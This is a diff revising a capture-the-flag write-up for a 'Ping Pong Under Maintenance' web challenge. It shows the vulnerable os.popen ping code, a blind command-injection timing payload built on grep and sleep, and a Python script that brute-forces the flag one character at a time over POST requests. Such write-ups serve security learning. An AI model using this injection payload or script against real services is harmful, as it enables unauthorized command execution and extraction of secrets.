@@ -1,56 +1,74 @@
-so basically
-for ping pong undermaintance
-if u look at the source code
-u realize that the function to excute a command is also called
-this means we can still use command injection
-however looking at how the page is rendered
-we see that no output from the excuted command will be printed
-this means we must use some other way to get information
-at first i thought that i could modify the html to add the flag into the bottom
-this way
-the flag would render at the bottom of the screen
-however i believe some commands are blocked such as rm as it would ruin the infrastructure
+## Write Up For Ping Pong Under Maintainance
 
-after a lot of thinking and testing
-i found that the sleep command works
-and causes the page longer to load results
-this means that a timing attck is possible
+First check what the difference between
+Ping Pong and Ping Pong Under Maintainance
 
-so we must find a way to set different times for testing if a string is in the flag or not
-we can use the payload
+### Ping Pong
+```py
+return render_template('index.html', output=output)
+```
+
+### Ping Pong Under Maintainance
+```py
+return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.')
+```
+
+Notice that the only difference between the two is that Ping Pong Under
+Maintainance won't output what the command does
+
+However, the program will still excute the command as seen in these lines
+
+```py
+hostname = request.form['hostname']
+cmd = "ping -c 3 " + hostname
+output = os.popen(cmd).read()
+```
+
+This means command injection is still viable
+but there must be some other way to get flag information
+
+After a lot of thinking, testing, and failing
+I finally found a timing attack
+
+If it is possible to check whether some substring exists in the flag file
+then use that change the website reponse time depending on true or false then it would be possible to brute force each character till the flag is found
+
+### The Payload
 
 ```bash
 grep LITCTF{text flag.txt || sleep $?
 ```
 
-using this commmand we also avoid using url encoded character which would not work in our command
+Using this command can check if some prefix starting with LITCTF{ is in the flag file
 
-testing this command out we can see that a proper prefix such as LITCTF causes the website to load almost instantly
-however if we dont use a substring such at adsklfjhlkasjdfhkl it would cause the website to take over a second to load
+$? returns 1 if the text grepped is in the file and 0 if it is not
 
-now that we have this command 
+Testing this command out, a proper prefix such as LITCTF causes the website to respond almost instantly;
+however, a string such at ASHJFJSHD would cause the website to take over a second to load
 
-we can test the prefix one character at a time
+Now that a working explot is found, 
+the prefix of the flag can be tested one character at a time
 
-setting up a python program we can send post request to the website testing the prefixes
-finding which character takes the least amount of time
-appending that to the known prefix and then testing the next character
-we end this once we get the closing brace
 
-and here is the python script to send injections 
+And here is a simple python program to find the flag one char at a time
+
+### Python Script
 
 ```py
 import requests
 import string
 
+#allowed characters in flag
 charlist = string.ascii_lowercase+string.digits+"_}"
-print(charlist)
+
+#known prefix
+flag = "LITCTF{"
 
 
-text = "LITCTF{"
-
+#changes with every instance
 url = 'http://34.130.180.82:59880/'
 
+#headers for POST request
 headers = {
     'Host': url,
     # 'Content-Length': '11',
@@ -66,42 +84,45 @@ headers = {
     'Connection': 'close',
 }
 
+
+#payload
 data = {
-    'hostname': 'hi',
+    'hostname': 'temp',
 }
 
-
-
+#loops till we get the flag
 while True:
-    ti = dict();
-    for x in charlist:
-        ti[x] = 0
+    #correct next character
+    bestchr = " "
 
+    #testing each character
     for x in charlist:
-        teststr = text+x
+        #test prefix
+        teststr = flag+x
+        #payload
         injection = f";grep -q {teststr} flag.txt || sleep $(($?*1))"
         data = {'hostname': injection}
+        #sending request
         req = requests.post(url, headers=headers, data=data)
-        print(teststr,req.elapsed.total_seconds())
-        ti[x] = req.elapsed.total_seconds()
-    
-    bestchr = ""
-    besttime = 1000
-    for x in charlist:
-        if(ti[x] < besttime):
-            besttime = ti[x]
+        #check how long it took
+        if req.elapsed.total_seconds() < 1:
+            #found the correct char
             bestchr = x
-    text+=bestchr
-    print(text)
+            break
+    
+    #appending char to flag
+    flag+=bestchr
+    #prints flag everytime we find the next char
+    print(flag)
+    #exits ones flag is found
     if(bestchr == '}'): break
 
 ```
 
-after a while of using this program
+After a while of using this program
 I was able to retrieve the flag
 
-```txt
-LITCTF{c4refu1_fr}
-```
+### LITCTF{c4refu1_fr}
 
-YOUR DID IT :D
+
+# YOUR DID IT :D
